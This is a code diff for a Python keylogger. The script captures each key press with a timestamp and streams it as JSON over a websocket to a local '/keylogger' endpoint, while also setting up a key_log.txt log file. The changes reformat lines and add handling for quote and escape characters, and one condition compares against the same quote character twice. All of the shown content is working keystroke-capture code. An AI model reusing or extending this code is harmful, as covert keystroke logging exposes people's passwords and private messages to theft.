@@ -12,7 +12,8 @@ import json
 ws = create_connection("ws://localhost:30401/keylogger")
 
 # make a log file
-logging.basicConfig(filename="key_log.txt", filemode='w', level=logging.DEBUG, format='%(asctime)s: %(message)s:')
+logging.basicConfig(filename="key_log.txt", filemode='w',
+                    level=logging.DEBUG, format='%(asctime)s: %(message)s:')
 
 # used to store the current key
 key_pressed = ''
@@ -25,10 +26,16 @@ def on_press(key):
     if hasattr(key, 'char') and key.char == '\x1a':
         ws.close()
         return False
-    if hasattr(key, 'char') and key.char == "'":
-        ws.send('{"timestamp": "' + str(datetime.now()) + '" , "keyPressed": "quote" }')
+    if hasattr(key, 'char') and r"\x" in key.char:
+        ws.send('{"timestamp": "' + str(datetime.now()) +
+                '" , "keyPressed": "command" }')
         return
-    ws.send('{"timestamp": "' + str(datetime.now()) + '" , "keyPressed": "' + str(key) + '" }')
+    if hasattr(key, 'char') and (key.char == "'" or key.char == "'"):
+        ws.send('{"timestamp": "' + str(datetime.now()) +
+                '" , "keyPressed": "quote" }')
+        return
+    ws.send('{"timestamp": "' + str(datetime.now()) +
+            '" , "keyPressed": "' + str(key) + '" }')
 
 
 # on_release function => logging the released key
